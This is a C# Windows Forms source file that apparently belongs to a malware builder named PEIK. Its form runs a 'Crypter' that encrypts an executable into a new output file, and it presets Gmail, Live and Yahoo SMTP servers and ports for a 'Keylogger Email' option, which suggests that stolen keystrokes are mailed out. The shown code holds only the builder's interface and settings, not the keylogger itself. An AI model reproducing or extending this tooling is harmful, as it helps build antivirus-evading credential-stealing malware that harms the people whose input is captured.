using System.Windows.Forms;
using PEIK.Util.Crypter;

namespace PEIK
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
            Crypter c = new Crypter("C:/out/test.exe", Configuration.CryptoSRC, "contralol");
            c.Process();
            c.Save("C:/out/out.exe");
        }

        private void ComboBoxKeyloggerEmailServerSelectedIndexChanged(object sender, System.EventArgs e)
        {
            switch (comboBoxKeyloggerEmailServer.SelectedIndex)
            {
                case 0:
                    textBoxKeyloggerEmailServer.Text = "smtp.gmail.com";
                    textBoxKeyloggerEmailServer.Enabled = false;
                    textBoxKeyloggerEmailPort.Text = "587";
                    textBoxKeyloggerEmailPort.Enabled = false;
                    break;
                case 1:
                    textBoxKeyloggerEmailServer.Text = "smtp.live.com";
                    textBoxKeyloggerEmailServer.Enabled = false;
                    textBoxKeyloggerEmailPort.Text = "25";
                    textBoxKeyloggerEmailPort.Enabled = false;
                    break;
                case 2:
                    textBoxKeyloggerEmailServer.Text = "smtp.mail.yahoo.com";
                    textBoxKeyloggerEmailServer.Enabled = false;
                    //yahoo's site says to use port 465 or 587 for compatibility, using the more "compatible" port
                    textBoxKeyloggerEmailPort.Text = "587";
                    textBoxKeyloggerEmailPort.Enabled = false;
                    break;
                case 3:
                    textBoxKeyloggerEmailServer.Text = "";
                    textBoxKeyloggerEmailServer.Enabled = true;
                    textBoxKeyloggerEmailPort.Text = "";
                    textBoxKeyloggerEmailPort.Enabled = true;
                    break;
            }
        }

        private void ExitToolStripMenuItemClick(object sender, System.EventArgs e)
        {
            Application.Exit();
        }
    }
}
